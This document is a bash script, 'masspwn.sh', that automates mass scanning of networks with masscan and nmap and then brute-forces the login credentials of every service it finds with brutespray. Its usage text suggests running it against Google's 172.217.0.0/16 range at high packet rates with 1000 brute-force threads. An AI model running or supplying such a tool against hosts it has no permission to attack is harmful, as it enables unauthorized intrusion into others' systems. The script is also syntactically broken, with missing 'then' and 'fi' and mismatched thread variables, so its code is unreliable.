green='\e[0;32m'
red='\e[0;31m'
purple='\e[0;35m'
yellow='\e[0;33m'
cyan='\e[0;36m'
light_green='\e[0;92m'
endColor='\e[0m'
item=${green}[*]${endColor}


HOSTS=""
PORTS=""
OUTPUT=""
USERS=""
PASSWORDS=""
RATE=""
THREADS=""


HOSTS_ARG=""
PORTS_ARG=""
OUTPUT_ARG=""
USERS_ARG=""
PASSWORDS_ARG=""
HELP_ARG=""
RATE_ARG=""
THREADS_ARG=""

# While the number of arguments not equal 0
while [ $# -ne 0 ]
do
    case "$1" in
    	--help)
		HELP_ARG="OK"
		shift
        ;;
	-h|--hosts)
		HOSTS_ARG="OK"
		HOSTS="$2"
		shift
        ;;
	-p[0-9]*)    
		PORTS_ARG="OK"
		PORTS="$1"
        ;;
	-o|--output)
		OUTPUT_ARG="OK"
		OUTPUT="$2"
		shift
        ;;
	-u|--users)
		USERS_ARG="OK"
		USERS="$2"
		shift
        ;;
	-pw|--passwords)
		PASSWORDS_ARG="OK"
		PASSWORDS="$2"
		shift
        ;;
	-r|--rate)
		RATE_ARG="OK"
		RATE="$2"
		shift
        ;;
	-t|--threads)
		THREAD_ARG="OK"
		THREAD="$2"
		shift
        ;;
    #*)
    #		echo -e "${red}WARNING: Invalid argument detected${endColor}"
    #		echo ""
    #    	show_help
    #    ;;
    esac
    shift
done

echo
echo -e "${red}   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████    ▄███████▄  ▄█     █▄  ███▄▄▄▄   ${endColor}"
echo -e "${red} ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███   ███    ███ ███     ███ ███▀▀▀██▄ ${endColor}"
echo -e "${red} ███   ███   ███   ███    ███   ███    █▀    ███    █▀    ███    ███ ███     ███ ███   ███ ${endColor}"
echo -e "${red} ███   ███   ███   ███    ███   ███          ███          ███    ███ ███     ███ ███   ███ ${endColor}"
echo -e "${red} ███   ███   ███ ▀███████████ ▀███████████ ▀███████████ ▀█████████▀  ███     ███ ███   ███ ${endColor}"
echo -e "${red} ███   ███   ███   ███    ███          ███          ███   ███        ███     ███ ███   ███ ${endColor}"
echo -e "${red} ███   ███   ███   ███    ███    ▄█    ███    ▄█    ███   ███        ███ ▄█▄ ███ ███   ███ ${endColor}"
echo -e "${red}  ▀█   ███   █▀    ███    █▀   ▄████████▀   ▄████████▀   ▄████▀       ▀███▀███▀   ▀█   █▀  ${endColor}"
echo -e "${red}                                                                                           ${endColor}"
echo -e "${red}                                                v0.1 by Juan Schällibaum                   ${endColor}"
echo


if [[ -z $HOSTS_ARG || -z $PORTS_ARG || -z $OUTPUT_ARG ]];then
	echo -e "${yellow}Usage:${endColor}"
	echo -e "${green}./masspwn.sh -h [CIDR | HOSTS LIST] -p[PORT RANGE] -o [OUTPUT DIRECTORY] <OPTIONS>${endColor}"
	echo
	echo -e "${yellow}Optional arguments:${endColor}"
	echo "-u   | --users [USERS WORDLIST]		  Specify custom wordlist for users bruteforce"
	echo "-pw  | --passwords [PASSWORDS WORDLIST]	  Specify custom wordlist for passwords bruteforce"
	echo "-r   | --rate [PACKETS PER SECCOND] 	  Set packets per seccond send to find open ports" 
	echo "-t   | --threads [BRUTEFORCE THREADS] 	  Set the number of threads used for bruteforce with bruespray"
	echo "--help					  Show this help message and exit"
	echo
	echo -e "${yellow}Examples:${endColor}"
	echo -e "${green}./masspwn.sh -h 172.217.0.0/16 -p1-65535 -r 10000 -t 1000 -o google${endColor}"
	echo "Scan all ports of Google hosts sending 10000 packets per seccond, bruteforce found services login with brutespray default credentials with 1000 threads, and saves results in 'google' folder"
	echo
	echo -e "${green}./masspwn.sh -h host_list.txt -p1-1000 -u /usr/share/wordlists/users.txt -p /usr/share/wordlists/passwords.txt -o results${endColor}"
	echo "Scan port range of 1 to 1000 of hosts listed in host_list.txt sending 600 packets per seccond, bruteforce found services login with customs wordlists for users and passwords with 6 threads, and saves results in 'results' folder"

	exit
fi


echo -e "${green}# Checking dependences...${endColor}"
echo

find_dependence () {
  if [ -f /usr/bin/$1 ]; then
    echo -e "${green}[*] $1 is installed${endColor}"
  else 
    echo -e "${red}[!] $1 isn't installed... Installing now${endColor}"
	echo
	apt install $1
	echo
  fi
}

find_dependence "masscan"
find_dependence "nmap"
find_dependence "brutespray"

if [ -d $OUTPUT ]; then
    rm -r $OUTPUT
fi

mkdir $OUTPUT
mkdir $OUTPUT/tmp

echo
echo -e "${green}#################################################${endColor}"
echo -e "${green}################ Running masscan ################${endColor}"
echo -e "${green}##### for find open ports in large networks #####${endColor}"
echo -e "${green}#################################################${endColor}"
echo

if [[ $HOSTS =~ [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.* ]]; then
	if [[ -z $RATE ]]; then
		echo -e "${purple}masscan $PORTS $HOSTS --max-rate 600 -oG $OUTPUT/masscan_results${endColor}"
		masscan $PORTS $HOSTS --max-rate 600 -oG $OUTPUT/masscan_results
	else
		echo -e "${purple}masscan $PORTS $HOSTS --max-rate $RATE -oG $OUTPUT/masscan_results${endColor}"
		masscan $PORTS $HOSTS --max-rate $RATE -oG $OUTPUT/masscan_results
	fi
else
	if [[ -z $RATE ]]; then
		echo -e "${purple}masscan $PORTS -iL $HOSTS --max-rate 600 -oG $OUTPUT/masscan_results${endColor}"
		masscan $PORTS -iL $HOSTS --max-rate 600 -oG $OUTPUT/masscan_results
	else
		echo -e "${purple}masscan $PORTS -iL $HOSTS --max-rate $RATE -oG $OUTPUT/masscan_results${endColor}"
		masscan $PORTS -iL $HOSTS --max-rate $RATE -oG $OUTPUT/masscan_results
	fi
fi

echo
echo -e "${cyan}[*] Masscan results:"
echo
cat $OUTPUT/masscan_results
echo -e "${endColor}"


#Para obtener todos los hosts encontrados separados por salto de linea
cat $OUTPUT/masscan_results | cut -d " " -f 2 | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $OUTPUT/tmp/hosts_list
#Para incluir los puertos que solo aparecen una vez
sort $OUTPUT/tmp/hosts_list | uniq -u > $OUTPUT/tmp/hosts_list_filtered
#Para incluir los puertos que se repiten
sort $OUTPUT/tmp/hosts_list | uniq -d >> $OUTPUT/tmp/hosts_list_filtered


#Para obtener todos los puertos encontrados separados por salto de linea
cat $OUTPUT/masscan_results | cut -d " " -f 4 | cut -d / -f 1 | grep '^[0-9]*$' > $OUTPUT/tmp/ports
#Para incluir los puertos que solo aparecen una vez
sort $OUTPUT/tmp/ports | uniq -u > $OUTPUT/tmp/ports_filtered
#Para incluir los puertos que se repiten
sort $OUTPUT/tmp/ports | uniq -d >> $OUTPUT/tmp/ports_filtered

echo
echo -e "${green}############################################${endColor}"
echo -e "${green}#### Running nmap services version scan ####${endColor}"
echo -e "${green}######### based on masscan results #########${endColor}"
echo -e "${green}############################################${endColor}"
echo
echo -e "${green}# Preparing nmap input, please wait...${endColor}"
echo



IFS=$'\n' read -d '' -r -a ip < $OUTPUT/tmp/hosts_list_filtered

for i in "${!ip[@]}"
do
	ip[$i]="${ip[$i]} -p "
done

lines_left=$(cat $OUTPUT/masscan_results | wc -l)

cat $OUTPUT/masscan_results | while read line
do
	host="$(echo $line | cut -d " " -f 2)"
	port="$(echo $line | cut -d " " -f 5 | cut -d / -f 1)"

	for i in "${!ip[@]}"
	do
		echo ${ip[$i]} > $OUTPUT/tmp/temp
		act=$(grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $OUTPUT/tmp/temp)
		#echo $act $host
		
		if [ $act == $host ]; then
			ip[$i]="${ip[$i]}$port,"
			break
		fi
	done
	lines_left=$(($lines_left - 1))
	if [ $lines_left == 0 ]; then
		for i in "${!ip[@]}"
		do
			echo -e "${purple}nmap ${ip[$i]::-1} -sV -Pn -T4 -oG $OUTPUT/tmp/$i.gnmap${endColor}"
			nmap ${ip[$i]::-1} -sV -Pn -T4 -oG $OUTPUT/tmp/$i.gnmap
			echo
		done
	fi
done

cat $OUTPUT/tmp/*.gnmap > $OUTPUT/nmap_results


#Para eliminar los archivos temporales
rm $OUTPUT/tmp/*

echo
echo -e "${green}##################################################################${endColor}"
echo -e "${green}###################### Running Brutespray ########################${endColor}"
echo -e "${green}#### based on nmap output to bruteforce services credentials #####${endColor}"
echo -e "${green}##################################################################${endColor}"
echo

if [[ $USERS_ARG && $PASSWORDS_ARG ]];then
	if [[ -z $THREADS_ARG ]]
		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5${endColor}"
		sleep 2
		brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5
	else 
		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads $THREADS --hosts 5${endColor}"
		sleep 2
		brutespray --file $OUTPUT/nmap_results -U $USERS -P $PASSWORDS -o $OUTPUT --threads 6 --hosts 5
else
	if [[ -z $THREADS_ARG ]]
		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5${endColor}"
		sleep 2
		brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5
	else
		echo -e "${purple}brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads $THREADS --hosts 5${endColor}"
		sleep 2
		brutespray --file $OUTPUT/nmap_results -o $OUTPUT --threads 6 --hosts 5
	fi
fi


